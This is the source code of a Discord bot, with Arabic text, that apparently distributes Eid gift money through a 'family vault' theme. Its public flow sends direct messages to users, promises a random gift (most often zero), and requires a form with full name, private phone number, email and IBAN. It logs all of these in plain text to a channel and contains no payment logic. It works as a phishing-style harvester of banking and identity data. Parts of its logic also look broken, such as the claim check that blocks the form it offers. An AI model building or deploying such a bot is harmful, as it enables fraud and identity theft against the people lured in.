const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("Bot is alive"));
app.listen(3000, () => console.log("Keep alive server started"));

const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  EmbedBuilder, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  InteractionType 
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;

// العائلة
const LOG_CHANNEL_FAMILY = "1481705807560310874"; // سجل العيديات العائلية
const VAULT_IMAGE = "https://images-ext-1.discordapp.net/external/7Pu3JB_gfrOlWCgqMDVaVNKSQyMwWfZFKF-nILTx30A/https/probot.media/khP5cxQfuI.jpg?format=webp&width=1376&height=860";

// النسخة العالنية
const LOG_CHANNEL_PUBLIC = "1481757344269336807";

const claimedUsersFamily = new Set();
const claimedUsersPublic = new Set();
const usedNames = new Set();
const usedPhones = new Set();
const usedEmails = new Set();
const usedIBANs = new Set();

// دوال العيدية
function getEidiyaPublic() {
  const rand = Math.floor(Math.random() * 100) + 1;
  if (rand <= 55) return 0;
  if (rand <= 95) return 5;
  return 10;
}

function getColor(amount) {
  if (amount === 0) return "#6e6e6e";
  if (amount === 5) return "#3498db";
  if (amount === 10) return "#d4af37";
  if (amount === 20) return "#9b59b6";
  if (amount === 50) return "#b8860b";
}

// ------------------- النسخة العائلية -------------------
client.on("interactionCreate", async interaction => {
  if(!interaction.isButton()) return;

  if(interaction.customId === "eidiya_button") {
    const userId = interaction.user.id;

    // العائلة
    if(claimedUsersFamily.has(userId)) {
      const rejectEmbed = new EmbedBuilder()
        .setColor("#ff0000")
        .setTitle("🚫 تم تسجيل اسمك مسبقًا")
        .setDescription(`اسمك مسجل بالفعل في **دفتر الدون**.\nلقد استلمت عيديتك مسبقًا، لا يمكن طلب أخرى.`)
        .setFooter({text:"دفتر الدون لا ينسى"})
        .setTimestamp();

      return interaction.reply({embeds:[rejectEmbed], ephemeral:true});
    }

    claimedUsersFamily.add(userId);

    const waitingEmbed = new EmbedBuilder()
      .setColor("#2f3136")
      .setTitle("خزنة العائلة")
      .setDescription(`قام الدون بفتح **خزنة العائلة** الآن.\nينظر في الصناديق ويقرر مقدار العيدية لكل فرد.\nانتظر قليلًا.`)
      .setFooter({text:"كل شيء يسجل في دفتر الدون"})
      .setTimestamp();

    await interaction.reply({embeds:[waitingEmbed], ephemeral:true});

    setTimeout(async () => {
      const amount = Math.floor(Math.random() * 100) < 70 ? 5 : (Math.random() * 100 < 85 ? 10 : (Math.random() * 100 < 95 ? 20 : 50));
      const resultEmbed = new EmbedBuilder()
        .setColor(getColor(amount))
        .setTitle("عيدية العائلة")
        .setDescription(`بعد تفقد خزنة العائلة، قرر الدون مقدار عيديتك.\n\nالمبلغ الذي حصلت عليه:\n**${amount} ريال**\n\nتم تسجيل العملية رسميًا في **دفتر الدون**.`)
        .setFooter({text:"العائلة لا تنسى"})
        .setTimestamp();

      await interaction.editReply({embeds:[resultEmbed]});

      const channel = client.channels.cache.get(LOG_CHANNEL_FAMILY);
      if(channel) {
        const logEmbed = new EmbedBuilder()
          .setColor("#111111")
          .setTitle("دفتر الدون")
          .setDescription(`${interaction.user} استلم عيديته.\nالمبلغ: **${amount} ريال**\nتم تسجيل العملية في دفتر العائلة.`)
          .setTimestamp();
        channel.send({embeds:[logEmbed]});
      }

    },10000);
  }
});

// أمر !eid للعائلة
client.on("messageCreate", async message => {
  if(message.content === "!eid") {
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("eidiya_button")
        .setLabel("أبي عيدية")
        .setStyle(ButtonStyle.Success)
    );

    const embed = new EmbedBuilder()
      .setColor("#8B0000")
      .setTitle("خزنة العائلة 💰")
      .setDescription(`بأمر من **الدون** تم فتح خزنة العائلة اليوم.\nقرر الدون توزيع عيديات على أفراد العائلة تقديرًا لولائهم.\nاضغط على زر **أبي عيدية** ليقوم الدون بتحديد نصيبك بنفسه.\nكل عضو يحصل على عيدية واحدة فقط، ويتم تسجيل كل شيء في **دفتر الدون**.`)
      .setImage(VAULT_IMAGE)
      .setFooter({text:"العائلة فوق كل شيء"})
      .setTimestamp();

    message.channel.send({embeds:[embed], components:[row]});
  }
});

// ------------------- النسخة العلنية -------------------
client.on("messageCreate", async message => {
  if(message.channel.type === 1 || message.channel.type === 3) return; // تجاهل السيرفرات للعلني
  if(message.author.bot) return;

  const userId = message.author.id;
  if(claimedUsersPublic.has(userId)) return message.author.send("🚫 لقد استلمت عيديتك بالفعل، الفرصة انتهت.");

  claimedUsersPublic.add(userId);

  // إرسال الرسالة الأولى بالخطوات
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("public_eidiya_button")
      .setLabel("احصل على عيديتك")
      .setStyle(ButtonStyle.Primary)
  );

  const embed = new EmbedBuilder()
    .setColor("#8B0000")
    .setTitle("خزنة العيدية")
    .setDescription(`تم فتح خزنة العيدية. اضغط على الزر للحصول على نصيبك.`)
    .setImage(VAULT_IMAGE)
    .setFooter({text:"العيدية محدودة"})
    .setTimestamp();

  await message.author.send({embeds:[embed], components:[row]});
});

client.on("interactionCreate", async interaction => {
  if(!interaction.isButton()) return;

  if(interaction.customId === "public_eidiya_button") {
    const userId = interaction.user.id;
    if(claimedUsersPublic.has(userId)) return interaction.reply({content:"🚫 لقد استلمت عيديتك بالفعل، الفرصة انتهت.", ephemeral:true});

    // نموذج جمع البيانات
    const modal = new ModalBuilder()
      .setCustomId("public_eidiya_modal")
      .setTitle("بيانات العيدية");

    const nameInput = new TextInputBuilder()
      .setCustomId("name_input")
      .setLabel("اكتب اسمك الرباعي أو الثلاثي")
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const phoneInput = new TextInputBuilder()
      .setCustomId("phone_input")
      .setLabel("رقم جوالك الخاص")
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const emailInput = new TextInputBuilder()
      .setCustomId("email_input")
      .setLabel("الإيميل الخاص بك")
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const ibanInput = new TextInputBuilder()
      .setCustomId("iban_input")
      .setLabel("رقم الايبان الخاص بك")
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const row1 = new ActionRowBuilder().addComponents(nameInput);
    const row2 = new ActionRowBuilder().addComponents(phoneInput);
    const row3 = new ActionRowBuilder().addComponents(emailInput);
    const row4 = new ActionRowBuilder().addComponents(ibanInput);

    modal.addComponents(row1,row2,row3,row4);

    await interaction.showModal(modal);
  }
});

client.on("interactionCreate", async interaction => {
  if(interaction.type !== InteractionType.ModalSubmit) return;
  if(interaction.customId !== "public_eidiya_modal") return;

  const name = interaction.fields.getTextInputValue("name_input");
  const phone = interaction.fields.getTextInputValue("phone_input");
  const email = interaction.fields.getTextInputValue("email_input");
  const iban = interaction.fields.getTextInputValue("iban_input");

  if(usedNames.has(name) || usedPhones.has(phone) || usedEmails.has(email) || usedIBANs.has(iban)) {
    return interaction.reply({content:"🚫 تم استخدام أحد البيانات مسبقًا، لا يمكن استلام عيدية ثانية.", ephemeral:true});
  }

  usedNames.add(name);
  usedPhones.add(phone);
  usedEmails.add(email);
  usedIBANs.add(iban);

  const amount = getEidiyaPublic();
  const color = getColor(amount);

  const confirmEmbed = new EmbedBuilder()
    .setColor(color)
    .setTitle("عيديتك")
    .setDescription(`بعد مراجعة بياناتك، الدون يحدد مقدار عيديتك:\n**${amount} ريال**\nتأكد من الإيبان قبل تأكيد أي عملية.`)
    .setFooter({text:"العيدية محدودة"})
    .setTimestamp();

  await interaction.reply({embeds:[confirmEmbed], ephemeral:true});

  // سجل العملية
  const channel = client.channels.cache.get(LOG_CHANNEL_PUBLIC);
  if(channel){
    const logEmbed = new EmbedBuilder()
      .setColor("#111111")
      .setTitle("سجل العيديات العامة")
      .setDescription(`المستخدم: ${interaction.user}\nالاسم: ${name}\nرقم الجوال: ${phone}\nالإيميل: ${email}\nالإيبان: ${iban}\nالمبلغ: ${amount} ريال`)
      .setTimestamp();
    channel.send({embeds:[logEmbed]});
  }

  claimedUsersPublic.add(interaction.user.id);
});

// تسجيل الدخول
client.login(TOKEN);
